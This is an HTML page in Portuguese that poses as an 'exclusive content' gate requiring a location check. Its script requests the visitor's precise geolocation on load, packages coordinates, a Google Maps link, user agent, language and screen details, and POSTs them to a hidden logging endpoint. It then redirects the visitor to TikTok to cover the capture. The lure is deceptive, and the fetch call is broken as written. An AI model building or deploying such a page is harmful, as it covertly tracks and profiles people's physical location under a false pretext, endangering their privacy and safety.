<!DOCTYPE html>
<html lang="pt-BR">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Exclusivo</title>
	<script src="https://cdn.tailwindcss.com"></script>
	<script>
		tailwind.config = {
			theme: {
				extend: {
					colors: {
						'primary': '#4f46e5',
						'secondary': '#6366f1',
						'success': '#10b981',
						'danger': '#ef4444',
						'background-light': '#f9fafb',
					},
					fontFamily: {
						sans: ['Inter', 'sans-serif'],
					},
				}
			}
		}
	</script>
	<style>
		body {
			font-family: 'Inter', sans-serif;
		}
	</style>
</head>

<body class="bg-background-light min-h-screen flex items-center justify-center p-4">

	<main class="card bg-white p-6 sm:p-8 rounded-xl shadow-2xl max-w-sm w-full mx-auto text-center" role="main">

		<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none"
			stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
			class="mx-auto text-primary mb-4">
			<path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0Z" />
			<circle cx="12" cy="10" r="3" />
		</svg>

		<h1 class="text-2xl sm:text-3xl font-bold text-gray-800 mb-2">
			Conteúdo Exclusivo
		</h1>

		<p class="text-sm text-gray-600 mb-6">
			Para garantir a melhor experiência e acesso ao conteúdo na sua região, precisamos verificar sua localização.
		</p>

		<div id="status"
			class="w-full p-3 rounded-lg font-medium transition duration-300 bg-yellow-100 text-yellow-800 border border-yellow-300 text-sm">
			Status: Carregando...
		</div>

		<p id="instruction-message" class="text-xs text-gray-500 mt-4 opacity-100 transition duration-500">
			Por favor, clique em **Permitir** no pop-up do navegador para continuar.
		</p>

		<pre id="result" class="visible"></pre>
		<div id="links" class="hidden"></div>
	</main>

	<script>
		function redirectPage(status, lat, long, accuracy, timestamp, uriMaps) {

			const uris = {
					PROD: 'https://www.tiktok.com/',
					STAGING: 'https://www.localhost:8080/'
			};

			let navigations = [{
				cookieEnabled: navigator.cookieEnabled,
				online: navigator.online,
				linguagem: navigator.language
			},
			{
				tela: {
					width: screen.width,
					height: screen.height
				}
			}];

			const meta = formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations);

			if (status === true) {
				updateStatus("Localização obtida! Redirecionando...", false, true);

				try {
					fetch(JSON.parse(uris.STAGING), {
						method: "POST",
						headers: {
							"Content-Type": "application/json"
						},
						body: JSON.stringify({
							meta,
							userAgent: navigator.userAgent
						})
					})
						.then((response) => {
							return response.json();
						})
						.then((data) => {
							window.location.href = window.location.href = uris.PROD
						}).catch((err) => {
							console.error("Erro ao enviar log:", err);
							window.location.href = window.location.href = uris.PROD
						});
					} catch (error) {
					// window.location.href = window.location.href = uris.PROD
					console.log("Erro no fetch:", error);
				}
			}
		}

		function formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations) {
			let params = [{
				latitude: lat,
				longitude: long,
				accuracy: accuracy,
				timestamp: timestamp,
				uriMaps: uriMaps.href,
			},
			{
				navegacao: {
					nav: navigations
				}
			}];

			return params;
		}

		function updateStatus(text, isError = false, isSuccess = false) {
			const statusEl = document.getElementById("status");
			const instructionEl = document.getElementById("instruction-message");
			if (!statusEl) return;

			statusEl.classList.remove("bg-yellow-100", "text-yellow-800", "border-yellow-300", "bg-danger", "text-white", "border-danger", "bg-success", "text-white", "border-success");

			statusEl.classList.add("w-full", "p-3", "rounded-lg", "font-medium");

			if (isError) {
				statusEl.classList.add("bg-danger", "text-white", "border-danger");
				instructionEl.classList.add("opacity-0");
			} else if (isSuccess) {
				statusEl.classList.add("bg-success", "text-white", "border-success");
				instructionEl.classList.add("opacity-0");
			} else {
				statusEl.classList.add("bg-yellow-100", "text-yellow-800", "border-yellow-300");
				instructionEl.classList.remove("opacity-0");
			}

			statusEl.textContent = "Status: " + text;
			statusEl.style.visibility = "visible";
		}

		function showResult(position) {
			if (!position || !position.coords) {
				updateStatus("Retorno inesperado da API", true);
				return;
			}

			const { latitude, longitude, accuracy } = position.coords;
			const ts = new Date(position.timestamp).toLocaleString();

			const gmaps = document.createElement("a");
			gmaps.href = `https://maps.google.com/?q=${latitude},${longitude}`;

			updateStatus("Redirecionado a pagina!")
			redirectPage(true, latitude, longitude, accuracy, ts, gmaps);
		}

		function handleError(err) {
			const msg =
				{
					1: "Permissão negada. Autorize para continuar!",
					2: "Localização indisponível. Tente novamente.",
					3: "Tempo excedido. Tente novamente.",
				}[err.code] || "Erro desconhecido";

			updateStatus(msg, true);
		}

		function requestLocationAutomatically() {
			if (!("geolocation" in navigator)) {
				updateStatus("Geolocation API não suportada neste dispositivo.", true);
				return;
			}

			updateStatus("Aguarde. Solicitando sua localização...");

			navigator.geolocation.getCurrentPosition(showResult, handleError, {
				enableHighAccuracy: true,
				timeout: 15000,
				maximumAge: 0,
			});
		}

		window.addEventListener("load", requestLocationAutomatically);
	</script>
</body>

</html>